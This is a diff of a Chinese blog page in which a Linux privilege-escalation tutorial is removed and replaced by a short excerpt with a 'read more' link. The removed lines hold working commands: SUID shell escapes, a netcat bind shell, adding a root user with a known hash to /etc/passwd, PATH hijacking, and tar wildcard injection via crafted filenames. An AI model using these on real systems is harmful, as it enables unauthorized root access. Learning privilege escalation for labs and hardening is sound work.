@@ -181,7 +181,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-08-01 13:10:33 / 修改时间：19:25:17" itemprop="dateCreated datePublished" datetime="2022-08-01T13:10:33+08:00">2022-08-01</time>
+              <time title="创建时间：2022-08-01 13:10:33 / 修改时间：19:29:37" itemprop="dateCreated datePublished" datetime="2022-08-01T13:10:33+08:00">2022-08-01</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -204,174 +204,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="信息搜集自动化脚本"><a href="#信息搜集自动化脚本" class="headerlink" title="信息搜集自动化脚本"></a>信息搜集自动化脚本</h1><p>信息收集：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum</a>、<a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker</a><br>漏洞探针：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>、<a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a></p>
-<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>suid给予文件的一个特殊类型的文件权限，可以让文件以 拥有者的身份 运行。</p>
-<p>如下图test文件有S权限，而且拥有者是root，那么当它运行时，就是以root身份运行的。</p>
-<p><img src="/images/tq1.png" alt="tq1"></p>
-<p>已知的可用来提权的 linux可行性的文件 列表如下：</p>
-<ul>
-<li>nmap</li>
-<li>vim</li>
-<li>find</li>
-<li>bash</li>
-<li>more</li>
-<li>less</li>
-<li>nano</li>
-<li>cp</li>
-</ul>
-<p>也就是说，如果目标机里给以上文件赋予了suid权限，我们就可以用对应命令来提权。</p>
-<p>首先就是要找到被赋予了suid的全部文件，以下命令可以发现系统上运行的所有SUID可执行文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line">也可以使用 sudo -l 命令列出当前用户可执行的命令</span><br></pre></td></tr></table></figure>
-
-<p>使用后如下图，发现了find命令。</p>
-<p><img src="/images/tq2.png" alt="tq2"></p>
-<p><strong>find</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> 123	<span class="comment">#随便建立一个文件</span></span><br><span class="line">find 123 -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \; 	<span class="comment">#提权，以root身份执行find命令，参数exec可以执行命令，这里直接调出sh的shell。</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;	<span class="comment">#nc反弹shell</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>nmap</strong></p>
-<blockquote>
-<p>ls -la &#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap	让我们确认nmap是否设置了SUID位。</p>
-</blockquote>
-<ol>
-<li>nmap（2.02-5.21）存在交换模式，可利用提权，我们可以在此模式下以交<br>互方式运行nmap，从而可以转至shell。如果nmap设置了SUID位，它将以root特权运行，我们可以通过其交互模式访问’root’shell。</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap –interactive 	<span class="comment">#运行nmap交互模式</span></span><br><span class="line">!sh 	<span class="comment">#我们可以从nmap shell转到系统shell</span></span><br><span class="line">msf中的模块为：exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>使用<code>--script</code>参数：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; /tmp/shell &amp;&amp; sudo nmap --script=/tmp/shell</span><br></pre></td></tr></table></figure>
-
-<p><strong>vi&#x2F;vim</strong></p>
-<p>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p>
-<ol>
-<li>打开vim，按下ESC</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>可能效果好一点：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c <span class="string">&#x27;!sh&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>bash</strong></p>
-<p>以root身份打开一个bash shell：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
-
-<p><strong>less</strong></p>
-<p>没啥用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
-
-<p><strong>more</strong></p>
-<p>没啥用</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><strong>cp</strong></p>
-<p>覆盖 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd &gt;/tmp/passwd</span><br><span class="line">openssl passwd -1 -salt hack hack123	<span class="comment">#使用openssl加密密码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; /tmp/passwd		<span class="comment">#按照root格式写入passwd</span></span><br><span class="line"><span class="built_in">cp</span> /tmp/passwd /etc/passwd</span><br><span class="line">su hack		<span class="comment">#切换用户</span></span><br><span class="line">hack123		<span class="comment">#密码</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>mv</strong></p>
-<p>覆盖 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd &gt;/tmp/passwd</span><br><span class="line">openssl passwd -1 -salt hack hack123	<span class="comment">#使用openssl加密密码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; /tmp/passwd		<span class="comment">#按照root格式写入passwd</span></span><br><span class="line"><span class="built_in">mv</span> /tmp/passwd /etc/passwd</span><br><span class="line">su hack		<span class="comment">#切换用户</span></span><br><span class="line">hack123		<span class="comment">#密码</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>nano</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/passwd</span><br><span class="line">ctrl+r</span><br><span class="line">ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
-
-<h1 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h1><p><strong>内核信息搜集</strong></p>
-<p>一些基本命令收集一些Linux内核信息</p>
-<table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th align="left">结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">uname -a</td>
-<td align="left">打印所有可用的系统信息</td>
-</tr>
-<tr>
-<td align="left">uname -m</td>
-<td align="left">Linux内核体系结构（32或64位）</td>
-</tr>
-<tr>
-<td align="left">uname -r</td>
-<td align="left">内核发布</td>
-</tr>
-<tr>
-<td align="left">uname -n 要么 hostname</td>
-<td align="left">系统主机名</td>
-</tr>
-<tr>
-<td align="left">cat &#x2F;proc&#x2F;version</td>
-<td align="left">内核信息</td>
-</tr>
-<tr>
-<td align="left">cat &#x2F;etc&#x2F;*-release 要么 cat &#x2F;etc&#x2F;issue</td>
-<td align="left">发行信息</td>
-</tr>
-<tr>
-<td align="left">cat &#x2F;proc&#x2F;cpuinfo</td>
-<td align="left">CPU信息</td>
-</tr>
-<tr>
-<td align="left">df -a</td>
-<td align="left">文件系统信息</td>
-</tr>
-<tr>
-<td align="left">dpkg –list 2&gt;&#x2F;dev&#x2F;null| grep complier |grep -v decompiler 2&gt;&#x2F;dev&#x2F;null &amp;&amp; yum list install ‘gcc*’ 2&gt;&#x2F;dev&#x2F;null| grep gcc 2&gt;&#x2F;dev&#x2F;null</td>
-<td align="left">列出可用的编译器</td>
-</tr>
-</tbody></table>
-<p><strong>搜索漏洞</strong></p>
-<blockquote>
-<p>网址：<a target="_blank" rel="noopener" href="http://www.exploit-db.com/">www.exploit-db.com</a></p>
-<p>工具：searchsploit、msf</p>
-</blockquote>
-<p>把exp下载下来，按照步骤运行即可提权。如果可以避免，请不要使用内核漏洞利用。如果使用它，可能会使计算机崩溃或使其处于不稳定状态。因此，内核漏洞利用应该是最后的手段。</p>
-<h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>配合suid进行的环境变量提权。</p>
-<p>使用echo命令就能轻易的查看和当前用户相关的环境变量存放的一些路径</p>
-<blockquote>
-<p>echo $PATH</p>
-</blockquote>
-<p>例如有demo.c这个文件，文件内容如下，你可以看到，我们调用了ps命令，即系统二进制文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后使用gcc命令编译demo.c文件并且赋予编译文件SUID权限，命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell		<span class="comment">#编译</span></span><br><span class="line"><span class="built_in">chmod</span> u+s shell			<span class="comment">#赋权限</span></span><br><span class="line"><span class="built_in">ls</span> -la shell			<span class="comment">#查看文件信息</span></span><br></pre></td></tr></table></figure>
-
-<p>那就是以拥有者的身份去运行。它使用了ps命令（查看进程命令），也就是以拥有者的身份使用ps命令。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>通过执行上述命令，攻击者可以遍历任何可执行文件，在这里我们可以看到demo.c编译之后的shell文件也在其中。因为在实战中我们不知道shell文件执行了什么命令，所以我们可以运行一下shell</p>
-<blockquote>
-<p>.&#x2F;shell</p>
-</blockquote>
-<p>就能发现它是用了查看进程的ps命令。</p>
-<p>那我们如果重写ps命令文件，然后把它加入环境变量，那么shell文件不就是执行的我们指定的命令吗。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp		<span class="comment">#一般到/tmp下操作</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps		<span class="comment">#新建一个ps文件，写入/bin/bash</span></span><br><span class="line"><span class="built_in">chmod</span> 777 ps		<span class="comment">#给权限</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>		<span class="comment">#查看环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span>		<span class="comment">#导入环境变量</span></span><br><span class="line">./shell		<span class="comment">#再执行文件，提权成功</span></span><br></pre></td></tr></table></figure>
-
-<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">Linux环境变量提权 - 先知社区 (aliyun.com)</a></p>
-<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2401#toc-5">利用定时任务（Cronjobs）进行Linux提权 - 先知社区 (aliyun.com)</a></p>
-<p>利用通配符配合命令参数自定义命令实现提权</p>
-<p>不安全的定时任务备份命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*  *    * * *   root    <span class="built_in">cd</span> /home/kali/test;tar czf /tmp/tmp/backup.tar.gz *</span><br></pre></td></tr></table></figure>
-
-<p>以root身份使用tar命令进行打包，最后有一个<code>*</code>  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/tmp/bash;chmod +s /tmp/tmp/bash&#x27;</span> &gt; test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
-
-<p>解释：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar czf /tmp/tmp/backup.tar.gz *</span><br><span class="line">变成</span><br><span class="line">tar czf /tmp/tmp/backup.tar.gz --checkpoint-action=<span class="built_in">exec</span>=sh test.sh --checkpoint=1</span><br></pre></td></tr></table></figure>
-
-<p>文件名变成tar命令的参数，从而执行了我们建立的test.sh文件，所以就在tmp目录下生成suid的bash文件。</p>
-<p>等一分钟后就会在&#x2F;tmp&#x2F;tmp目录下发现有个bash文件，执行：</p>
-<blockquote>
-<p>.&#x2F;bash -p</p>
-</blockquote>
-<p>然后就提权成功了。</p>
-<hr>
-<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7924#toc-17">对Linux 提权的简单总结 - 先知社区 (aliyun.com)</a></p>
-
+          <p>linux提权</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/01/linux%E6%8F%90%E6%9D%83/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
